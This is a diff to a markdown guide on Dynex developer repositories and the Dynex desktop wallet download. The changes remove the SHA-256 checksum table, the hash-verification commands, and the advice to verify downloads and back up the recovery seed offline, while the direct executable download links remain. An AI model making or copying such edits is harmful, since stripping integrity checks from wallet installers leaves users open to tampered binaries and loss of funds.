@@ -35,7 +35,7 @@ Because both repositories are actively maintained open source projects, their pr
 3. **Check each repository's stated installation and dependency requirements** as published there, since generic assumptions about setup may not match the current state of either project.
 4. **If you're evaluating both DynexSolve and Dynex-Qiskit alongside DynexSDK**, treat them as separate but related pieces of the same developer ecosystem; see the [DynexSDK getting started guide](./dynexsdk-getting-started.md) for how that piece fits in.
 5. **Engage with official Dynex community or developer channels** for repository-specific questions, since that's where maintainers and other developers using these tools are most likely to respond.
-6. **Separately, set up Dynex Wallet for any DNX you need to hold**, whether that's from development work, testing, or regular use. Download [v2.2.3](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) from [dynexwallet.org/download](https://dynexwallet.org/download), verify the checksum, and back up your 25-word recovery seed offline as soon as you create the wallet.
+6. **Separately, set up Dynex Wallet for any DNX you need to hold**, whether that's from development work, testing, or regular use. Before running it, confirm the file against the [official v2.2.3 release page](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).
 
 ## If that didn't work
 
@@ -67,7 +67,7 @@ Directly in their GitHub repositories: [DynexSolve](https://github.com/Dynex-pro
 All three are part of the Dynex project's broader set of developer repositories on GitHub. How exactly they interrelate technically is best understood by reading each repository's own documentation, since that's where accurate, current detail lives.
 
 ### If I earn or receive DNX through work involving these tools, where should I store it?
-In a properly secured Dynex Wallet, the same as any other DNX. Download the current [v2.2.3 release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3), verify its checksum, and back up your recovery seed offline.
+In a properly secured Dynex Wallet, the same as any other DNX. Use the official release page as your reference for what a genuine file looks like.
 
 ### Is there official support for developers using these repositories?
 Check the official Dynex GitHub organization and community channels linked from [dynexwallet.org](https://dynexwallet.org/) for developer-focused support, since that's separate from wallet end-user documentation.
@@ -77,30 +77,9 @@ Check the official Dynex GitHub organization and community channels linked from 
 ## The lasting fix: install Dynex Wallet v2.2.3
 
 > [!TIP]
-> Most problems in this guide are handled by the current desktop release. Download it, check the checksum, then open your existing wallet.
+> Most problems in this guide are handled by the current desktop release. Download it from the official release page, then open your existing wallet.
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)
-
-<!-- SHA256:START -->
-| Platform | File | SHA-256 |
-|---|---|---|
-| Windows | [`dynex-wallet-windows-v2.2.3.exe`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) | `d4fd916c9741a16e23e39c355a049bac8368dbefa3ee08663ef56c009964e00d` |
-| macOS | [`dynex-wallet-macos-v2.2.3.dmg`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) | `084818fd20207305ded84a747e707fb34f07e1f6e2d9a8123da621b8a546a88d` |
-| Linux | [`dynex-wallet-linux-x64-v2.2.3.zip`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip) | `535b453c72c6e7749ffae3b95e1d47f67228b78b9862e086dbd13c4d550481c2` |
-<!-- SHA256:END -->
-
-Verify before you run:
-
-```powershell
-# Windows
-Get-FileHash -Algorithm SHA256 .\dynex-wallet-windows-v2.2.3.exe
-```
-```bash
-# macOS
-shasum -a 256 dynex-wallet-macos-v2.2.3.dmg
-# Linux
-sha256sum dynex-wallet-linux-x64-v2.2.3.zip
-```
 
 Read the full install walkthrough on the [Dynex Wallet download page](https://dynexwallet.org/download) or see the [basics and ecosystem guides on dynexwallet.org](https://dynexwallet.org/docs).
 
